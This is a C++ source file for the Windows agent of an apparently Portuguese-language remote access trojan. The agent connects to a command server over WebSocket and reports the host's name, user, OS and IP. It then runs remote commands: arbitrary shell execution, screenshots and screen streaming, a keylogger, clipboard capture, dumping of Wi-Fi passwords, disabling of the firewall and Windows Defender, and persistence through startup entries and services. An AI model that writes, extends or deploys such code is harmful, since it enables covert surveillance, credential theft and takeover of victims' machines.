#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
#ifndef NOMINMAX
#define NOMINMAX
#endif

#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <iphlpapi.h>

#include "../include/websocket_client.h"
#include "../include/agent_functions.h"

#include <iostream>
#include <string>
#include <thread>
#include <atomic>
#include <chrono>
#include <sstream>
#include <vector>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "iphlpapi.lib")

static const char* SERVER_HOST      = "127.0.0.1";
static const int   SERVER_PORT      = 4000;
static const int   RECONNECT_DELAY  = 5;

static WebSocketClient* g_ws      = nullptr;
static std::string      g_agentId;

static std::atomic<bool> g_streamActive{ false };
static std::thread       g_streamThread;

static void stopStream() {
    g_streamActive = false;
    if (g_streamThread.joinable())
        g_streamThread.join();
}

static void startStream(int fps, int quality, int scale) {
    stopStream();
    g_streamActive = true;
    g_streamThread = std::thread([fps, quality, scale]() {
        int delayMs = (fps > 0) ? (1000 / fps) : 200;
        while (g_streamActive && g_ws && g_ws->isConnected()) {
            std::string frame = captureFrameBase64(quality, scale);
            if (!frame.empty() && g_streamActive) {
                std::ostringstream body;
                body << "\"dataType\":\"stream_frame\","
                     << "\"payload\":{\"image\":\"" << frame << "\"}";
                g_ws->send("{\"type\":\"data\"," + body.str() + "}");
            }
            std::this_thread::sleep_for(std::chrono::milliseconds(delayMs));
        }
    });
}

static std::string makeMsg(const std::string& type, const std::string& body) {
    return "{\"type\":\"" + type + "\"," + body + "}";
}

static void sendResult(const std::string& commandId,
                       const std::string& output,
                       bool isError = false) {
    if (!g_ws) return;
    std::ostringstream body;
    body << "\"commandId\":\"" << jsonEscape(commandId) << "\","
         << (isError ? "\"error\"" : "\"output\"")
         << ":\"" << jsonEscape(output) << "\"";
    g_ws->send(makeMsg("command_result", body.str()));
}

static void sendData(const std::string& dataType,
                     const std::string& payloadJson) {
    if (!g_ws) return;
    std::ostringstream body;
    body << "\"dataType\":\"" << jsonEscape(dataType) << "\","
         << "\"payload\":" << payloadJson;
    g_ws->send(makeMsg("data", body.str()));
}

static std::string buildRegisterMsg() {
    char hostname[MAX_COMPUTERNAME_LENGTH + 1] = {};
    DWORD hnLen = static_cast<DWORD>(sizeof(hostname));
    GetComputerNameA(hostname, &hnLen);

    char username[256] = {};
    DWORD unLen = static_cast<DWORD>(sizeof(username));
    GetUserNameA(username, &unLen);

    
    char ipBuf[64] = "127.0.0.1";
    {
        ULONG bufLen = 15000;
        std::vector<BYTE> adapterBuf(bufLen);
        DWORD ret = GetAdaptersAddresses(
            AF_INET, GAA_FLAG_SKIP_ANYCAST, nullptr,
            reinterpret_cast<PIP_ADAPTER_ADDRESSES>(adapterBuf.data()),
            &bufLen);
        if (ret == NO_ERROR) {
            PIP_ADAPTER_ADDRESSES pAddr =
                reinterpret_cast<PIP_ADAPTER_ADDRESSES>(adapterBuf.data());
            while (pAddr) {
                if (pAddr->OperStatus == IfOperStatusUp &&
                    pAddr->IfType    != IF_TYPE_SOFTWARE_LOOPBACK &&
                    pAddr->FirstUnicastAddress) {
                    SOCKADDR* sa =
                        pAddr->FirstUnicastAddress->Address.lpSockaddr;
                    if (sa->sa_family == AF_INET) {
                        struct sockaddr_in* sin =
                            reinterpret_cast<struct sockaddr_in*>(sa);
                        InetNtopA(AF_INET, &sin->sin_addr,
                                  ipBuf, sizeof(ipBuf));
                        break;
                    }
                }
                pAddr = pAddr->Next;
            }
        }
    }

    std::string osStr = "Windows";
    {
        OSVERSIONINFOEXW osvi;
        ZeroMemory(&osvi, sizeof(osvi));
        osvi.dwOSVersionInfoSize = sizeof(osvi);
        typedef LONG(WINAPI* RtlGetVersionPtr)(PRTL_OSVERSIONINFOW);
        HMODULE hMod = GetModuleHandleW(L"ntdll.dll");
        if (hMod) {
            RtlGetVersionPtr fn = reinterpret_cast<RtlGetVersionPtr>(
                GetProcAddress(hMod, "RtlGetVersion"));
            if (fn) {
                fn(reinterpret_cast<PRTL_OSVERSIONINFOW>(&osvi));
                std::ostringstream ss;
                ss << "Windows " << osvi.dwMajorVersion
                   << "." << osvi.dwMinorVersion;
                osStr = ss.str();
            }
        }
    }

    std::ostringstream body;
    body << "\"info\":{"
         << "\"hostname\":\"" << jsonEscape(hostname) << "\","
         << "\"username\":\"" << jsonEscape(username) << "\","
         << "\"os\":\""       << jsonEscape(osStr)    << "\","
         << "\"ip\":\""       << jsonEscape(ipBuf)    << "\""
         << "}";
    return makeMsg("agent_register", body.str());
}

static void handleCommand(const std::string& msgJson) {
    auto extract = [&](const std::string& key) -> std::string {
        std::string search = "\"" + key + "\":\"";
        size_t pos = msgJson.find(search);
        if (pos == std::string::npos) return "";
        pos += search.size();
        size_t end = msgJson.find('"', pos);
        if (end == std::string::npos) return "";
        std::string val;
        for (size_t i = pos; i < end; ++i) {
            if (msgJson[i] == '\\' && i + 1 < end) {
                ++i;
                switch (msgJson[i]) {
                    case '"':  val += '"';  break;
                    case '\\': val += '\\'; break;
                    case 'n':  val += '\n'; break;
                    case 'r':  val += '\r'; break;
                    case 't':  val += '\t'; break;
                    default:   val += msgJson[i]; break;
                }
            } else {
                val += msgJson[i];
            }
        }
        return val;
    };

    auto extractArg0 = [&]() -> std::string {
        size_t pos = msgJson.find("\"args\":[\"");
        if (pos == std::string::npos) return "";
        pos += 9;
        size_t end = msgJson.find('"', pos);
        if (end == std::string::npos) return "";
        return msgJson.substr(pos, end - pos);
    };

    std::string commandId = extract("commandId");
    std::string command   = extract("command");

    if (command == "sysinfo") {
        sendData("sysinfo", getSysInfoJson());
        sendResult(commandId, "sysinfo enviado");
        return;
    }

    if (command == "processes") {
        sendData("processes", getProcessListJson());
        sendResult(commandId, "processes enviado");
        return;
    }

    if (command == "listdir") {
        std::string path = extractArg0();
        if (path.empty()) path = "C:\\";
        sendData("files", listDirectoryJson(path));
        sendResult(commandId, "listdir enviado");
        return;
    }

    if (command == "exec") {
        std::string cmd = extractArg0();
        if (cmd.empty()) {
            sendResult(commandId, "Nenhum comando fornecido.", true);
            return;
        }
        std::string output = execCommand(cmd);
        sendResult(commandId, output);
        return;
    }

    if (command == "screenshot") {
        std::string b64 = captureScreenshotBase64();
        if (b64.empty()) {
            sendData("screenshot", "{\"image\":null}");
            sendResult(commandId, "Falha ao capturar screenshot.", true);
        } else {
            std::string payload = "{\"image\":\"" + b64 + "\"}";
            sendData("screenshot", payload);
            sendResult(commandId, "screenshot enviado");
        }
        return;
    }

    if (command == "netinfo") {
        sendData("netinfo", getNetworkInfoJson());
        sendResult(commandId, "netinfo enviado");
        return;
    }

    if (command == "software") {
        sendData("software", getInstalledSoftwareJson());
        sendResult(commandId, "software enviado");
        return;
    }

    if (command == "kill") {
        std::string pidStr = extractArg0();
        if (pidStr.empty()) {
            sendResult(commandId, "PID nao fornecido.", true);
            return;
        }
        DWORD pid = static_cast<DWORD>(std::stoul(pidStr));
        sendResult(commandId, killProcess(pid));
        return;
    }

    if (command == "clipboard_get") {
        std::string content = getClipboardText();
        sendData("clipboard", "{\"content\":\"" + jsonEscape(content) + "\"}");
        sendResult(commandId, "clipboard enviado");
        return;
    }

    if (command == "clipboard_set") {
        std::string text = extractArg0();
        sendResult(commandId, setClipboardText(text));
        return;
    }

    if (command == "disk_info") {
        sendData("disk_info", getDiskInfoJson());
        sendResult(commandId, "disk_info enviado");
        return;
    }

    if (command == "startup_programs") {
        sendData("startup_programs", getStartupProgramsJson());
        sendResult(commandId, "startup_programs enviado");
        return;
    }

    if (command == "wifi_passwords") {
        sendData("wifi_passwords", getWifiPasswordsJson());
        sendResult(commandId, "wifi_passwords enviado");
        return;
    }

    if (command == "keylogger_start") {
        sendResult(commandId, keyloggerStart());
        return;
    }

    if (command == "keylogger_stop") {
        sendResult(commandId, keyloggerStop());
        return;
    }

    if (command == "keylogger_logs") {
        sendResult(commandId, keyloggerGetLogs());
        return;
    }

    if (command == "active_window") {
        sendResult(commandId, getActiveWindowInfo());
        return;
    }

    if (command == "services") {
        sendData("services", getServicesJson());
        sendResult(commandId, "services enviado");
        return;
    }

    if (command == "registry_read") {
        std::string key = extractArg0();
        auto extractArg1 = [&]() -> std::string {
            size_t pos = msgJson.find("\"args\":[\"");
            if (pos == std::string::npos) return "";
            pos += 9;
            size_t end = msgJson.find('"', pos);
            if (end == std::string::npos) return "";
            pos = msgJson.find("\",\"", end);
            if (pos == std::string::npos) return "";
            pos += 3;
            end = msgJson.find('"', pos);
            if (end == std::string::npos) return "";
            return msgJson.substr(pos, end - pos);
        };
        std::string value = extractArg1();
        sendResult(commandId, registryRead(key, value));
        return;
    }

    if (command == "env_vars") {
        sendResult(commandId, getEnvironmentVarsJson());
        return;
    }

    if (command == "lock_workstation") {
        sendResult(commandId, lockWorkstation());
        return;
    }

    if (command == "logoff_user") {
        sendResult(commandId, logoffUser());
        return;
    }

    if (command == "shutdown_system") {
        std::string delay = extractArg0();
        int delaySec = delay.empty() ? 30 : std::stoi(delay);
        sendResult(commandId, shutdownSystem(delaySec));
        return;
    }

    if (command == "reboot_system") {
        std::string delay = extractArg0();
        int delaySec = delay.empty() ? 30 : std::stoi(delay);
        sendResult(commandId, rebootSystem(delaySec));
        return;
    }

    if (command == "disable_firewall") {
        sendResult(commandId, disableFirewall());
        return;
    }

    if (command == "enable_firewall") {
        sendResult(commandId, enableFirewall());
        return;
    }

    if (command == "firewall_rules") {
        sendResult(commandId, getFirewallRulesJson());
        return;
    }

    if (command == "disable_defender") {
        sendResult(commandId, disableWindowsDefender());
        return;
    }

    if (command == "enable_defender") {
        sendResult(commandId, enableWindowsDefender());
        return;
    }

    if (command == "defender_status") {
        sendResult(commandId, getAntivirusStatusJson());
        return;
    }

    if (command == "persist_startup") {
        std::string name = extractArg0();
        auto extractArg1 = [&]() -> std::string {
            size_t pos = msgJson.find("\"args\":[\"");
            if (pos == std::string::npos) return "";
            pos += 9;
            size_t end = msgJson.find('"', pos);
            if (end == std::string::npos) return "";
            pos = msgJson.find("\",\"", end);
            if (pos == std::string::npos) return "";
            pos += 3;
            end = msgJson.find('"', pos);
            if (end == std::string::npos) return "";
            return msgJson.substr(pos, end - pos);
        };
        std::string path = extractArg1();
        sendResult(commandId, persistenceAddStartup(name, path));
        return;
    }

    if (command == "persist_service") {
        std::string name = extractArg0();
        auto extractArg1 = [&]() -> std::string {
            size_t pos = msgJson.find("\"args\":[\"");
            if (pos == std::string::npos) return "";
            pos += 9;
            size_t end = msgJson.find('"', pos);
            if (end == std::string::npos) return "";
            pos = msgJson.find("\",\"", end);
            if (pos == std::string::npos) return "";
            pos += 3;
            end = msgJson.find('"', pos);
            if (end == std::string::npos) return "";
            return msgJson.substr(pos, end - pos);
        };
        std::string path = extractArg1();
        sendResult(commandId, persistenceAddService(name, path));
        return;
    }

    if (command == "stream_start") {
        auto extractArgN = [&](int n) -> std::string {
            size_t pos = msgJson.find("\"args\":[");
            if (pos == std::string::npos) return "";
            pos += 8;
            for (int i = 0; i < n; ++i) {
                pos = msgJson.find(',', pos);
                if (pos == std::string::npos) return "";
                ++pos;
            }
            if (pos < msgJson.size() && msgJson[pos] == '"') ++pos;
            size_t end = msgJson.find_first_of("\",]", pos);
            if (end == std::string::npos) return "";
            return msgJson.substr(pos, end - pos);
        };

        int fps     = 5;
        int quality = 50;
        int scale   = 75;
        try {
            std::string a0 = extractArg0();
            std::string a1 = extractArgN(1);
            std::string a2 = extractArgN(2);
            if (!a0.empty()) fps     = std::stoi(a0);
            if (!a1.empty()) quality = std::stoi(a1);
            if (!a2.empty()) scale   = std::stoi(a2);
        } catch (...) {}

        if (fps     < 1)   fps     = 1;
        if (fps     > 15)  fps     = 15;
        if (quality < 10)  quality = 10;
        if (quality > 90)  quality = 90;
        if (scale   < 25)  scale   = 25;
        if (scale   > 100) scale   = 100;

        startStream(fps, quality, scale);
        sendResult(commandId, "Stream iniciado.");
        return;
    }

    if (command == "stream_stop") {
        stopStream();
        sendResult(commandId, "Stream parado.");
        return;
    }

    sendResult(commandId, "Comando desconhecido: " + command, true);
}

int WINAPI WinMain(HINSTANCE , HINSTANCE ,
                   LPSTR , int ) {
#ifdef _DEBUG
    AllocConsole();
    FILE* f = nullptr;
    freopen_s(&f, "CONOUT$", "w", stdout);
    freopen_s(&f, "CONOUT$", "w", stderr);
#endif

    std::cout << "[Agent] Iniciando..." << std::endl;

    while (true) {
        WebSocketClient ws;
        g_ws = &ws;

        ws.onMessage([](const std::string& msg) {
            std::thread([msg]() {
                if (msg.find("\"type\":\"command\"") != std::string::npos) {
                    handleCommand(msg);
                } else if (msg.find("\"type\":\"registered\"") !=
                           std::string::npos) {
                    size_t pos = msg.find("\"agentId\":\"");
                    if (pos != std::string::npos) {
                        pos += 11;
                        size_t end = msg.find('"', pos);
                        if (end != std::string::npos)
                            g_agentId = msg.substr(pos, end - pos);
                        std::cout << "[Agent] Registrado: "
                                  << g_agentId << std::endl;
                    }
                }
            }).detach();
        });

        ws.onClose([]() {
            std::cout << "[Agent] Conexão encerrada." << std::endl;
        });

        std::cout << "[Agent] Conectando a "
                  << SERVER_HOST << ":" << SERVER_PORT << "..." << std::endl;

        if (ws.connect(SERVER_HOST, SERVER_PORT)) {
            std::cout << "[Agent] Conectado. Enviando registro..." << std::endl;
            ws.send(buildRegisterMsg());

            while (ws.isConnected()) {
                std::this_thread::sleep_for(std::chrono::seconds(1));
            }
            stopStream();
        } else {
            std::cout << "[Agent] Falha na conexão." << std::endl;
        }

        g_ws = nullptr;
        std::cout << "[Agent] Reconectando em "
                  << RECONNECT_DELAY << "s..." << std::endl;
        std::this_thread::sleep_for(std::chrono::seconds(RECONNECT_DELAY));
    }

    return 0;
}

